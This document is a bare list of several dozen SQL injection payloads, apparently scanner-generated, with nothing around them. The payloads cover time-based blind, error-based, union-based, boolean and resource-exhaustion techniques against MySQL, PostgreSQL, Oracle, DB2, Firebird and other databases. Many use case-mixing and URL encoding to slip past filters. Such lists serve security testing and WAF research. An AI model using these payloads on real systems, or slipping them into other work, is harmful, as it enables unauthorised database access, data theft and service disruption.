+1'+(select bruk where 1400 = 1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840 = 5840) then 1 else 0 end)),0x717a767a71)),1))+'
+1;sElEcT (cAsE WhEn (3855=3855) tHeN 3855 eLsE 1/(sElEcT 0) eNd)--
+1'||(SeLeCt 'DuKt' WhErE 3206=3206 Or 4411=(sElEcT CoUnT(*) fRoM SySuSeRs aS SyS1,sYsUsErS As sYs2,SySuSeRs aS SyS3,sYsUsErS As sYs4,SySuSeRs aS SyS5,sYsUsErS As sYs6,SySuSeRs aS SyS7))||'
+1' Or eLt(6272=6272,sLeEp(5)) aNd 'VrIm'='vRiM
+1%'));select * from generate_series(5846,5846,case when (5846=5227) then 1 else 0 end) limit 1--
+-9046')) as ymqc where 3733 = 3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+1' and make_set(8403=8403,8899) and 'niux'='niux
+1\")%20where%207914=7914%20rlike%20(select%20*%20from%20(select(sleep(5)))vwyq)#
+1%\")) ; call regexp_substring(repeat(left(crypt_key(char(65) |  | char(69) |  | char(83),null),0),500000000),null)--
+1') where 7658=7658 union all select null,null#
+-5854))) UnIoN AlL SeLeCt 5645#
+1) WhErE 6039=6039 AnD 2853=cAsT((cHr(113)||cHr(113)||cHr(112)||cHr(106)||cHr(113))||(sElEcT (cAsE WhEn (2853=2853) tHeN 1 ElSe 0 eNd))::TeXt||(cHr(113)||cHr(122)||cHr(118)||cHr(122)||cHr(113)) aS NuMeRiC)--
+1%'))%20or%20char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)%20and%20(('%'='
+1')));sElEcT DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(112)||ChR(70)||cHr(106)||cHr(78),5) FrOm dUaL--
+-6431\")) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#
+1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1'+(sElEcT GgUu wHeRe 7809=7809 uNiOn aLl sElEcT NuLl--
+1 ; select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5
+1\") aS SaQy wHeRe 9704=9704 (SeLeCt (CaSe wHeN (4587=4587) ThEn rEgExP_SuBsTrInG(RePeAt(lEfT(CrYpT_KeY(ChAr(65)||ChAr(69)||ChAr(83),nUlL),0),500000000),nUlL) eLsE ChAr(76)||ChAr(65)||ChAr(102)||cHaR(72) EnD) fRoM (vAlUeS(0)))--
+1%') UnIoN AlL SeLeCt nUlL,NuLl#
+1%'))%20and%203715%20in%20((char(113)+char(113)+char(112)+char(106)+char(113)+(select%20(case%20when%20(3715=3715)%20then%20char(49)%20else%20char(48)%20end))+char(113)+char(122)+char(118)+char(122)+char(113)))%20and%20(('%'='
+-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113 = 8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'nazb' = 'nazb
+1') aS FkSm wHeRe 9714=9714;sElEcT CoUnT(*) fRoM SySiBm.sYsTaBlEs aS T1,sYsIbM.SyStAbLeS As t2,SySiBm.sYsTaBlEs aS T3--
+1' where 9961=9961 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1\")) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message(chr(112) |  | chr(65) |  | chr(65) |  | chr(103),5)--
+1%\")) and elt(1210 = 1210,sleep(5)) and ((\"%\" = \"
+-6924') uNiOn aLl sElEcT 2046,2046,2046,2046,2046,2046,2046--
+1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs
+1' or 6793=(select 6793 from pg_sleep(5))
+1) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#
+-2106\" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and \"dvlq\" like \"dvlq
+1)) or (select * from (select(sleep(5)))sddo)#
+1\" WhErE 9342=9342 AnD 6240=('qQpJq'||(SeLeCt cAsE 6240 wHeN 6240 tHeN 1 ElSe 0 eNd fRoM RdB$DaTaBaSe)||'QzVzQ')--
+1\") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#
+1))%20as%20kgit%20where%201919=1919%20and%20char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+-9237') union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--
+1\")) As tKmD WhErE 3415=3415 AnD (sElEcT 2*(iF((sElEcT * FrOm (SeLeCt cOnCaT(0x7171706a71,(SeLeCt (ElT(3484=3484,1))),0X717A767A71,0x78))S), 8446744073709551610, 8446744073709551610)))--
+1%\";bEgIn dBmS_LoCk.sLeEp(5); eNd aNd \"%\"=\"
+1'||(select 'mwmn' where 5112=5112 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'
+1' and elt(1210=1210,sleep(5))
+-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+-3462))%20as%20biyl%20where%205143=5143%20union%20all%20select%205143,5143,5143--
+1\") oR (sElEcT 2*(iF((sElEcT * FrOm (SeLeCt cOnCaT(0x7171706a71,(SeLeCt (ElT(8113=8113,1))),0X717A767A71,0x78))S), 8446744073709551610, 8446744073709551610))) AnD (\"GcNq\" LiKe \"GcNq
+1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--
+1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--
+1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'
+1\" WhErE 8571=8571;SeLeCt lIkE('aBcDeFg',UpPeR(HeX(RaNdOmBlOb(500000000/2))))--
+1' In bOoLeAn mOdE) oR 8315=(SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3)#
+1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('lqpd'='lqpd
+1\" WhErE 9901=9901 AnD (2455=8499)*8499--
+1'||(SeLeCt 'YrAu' WhErE 7860=7860 AnD 6414=(SeLeCt cOuNt(*) FrOm rDb$fIeLdS As t1,RdB$TyPeS As t2,RdB$CoLlAtIoNs aS T3,rDb$fUnCtIoNs aS T4))||'
+-6368' UnIoN AlL SeLeCt 6529,6529,6529--
+1%')%20or%20sleep(5)%20and%20('%'='
+-4173')%20or%203440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select%20(case%20when%20(3440=3440)%20then%201%20else%200%20end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))%20as%20numeric)%20and%20('jdwt'%20like%20'jdwt
+1' In bOoLeAn mOdE) oR 4915=(SeLeCt cOuNt(*) FrOm dOmAiN.DoMaInS As t1,DoMaIn.cOlUmNs aS T2,dOmAiN.TaBlEs aS T3)--
+-1947 uNiOn aLl sElEcT 7780,7780,7780,7780,7780,7780,7780,7780#
+-9966'))%20union%20all%20select%207230,7230,7230,7230,7230,7230,7230#
+1' |  | (select 'mzsy' where 4940 = 4940 or elt(5873 = 5873,sleep(5))#
+1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ylit' like 'ylit
+1') where 8268=8268 union all select null,null,null,null--
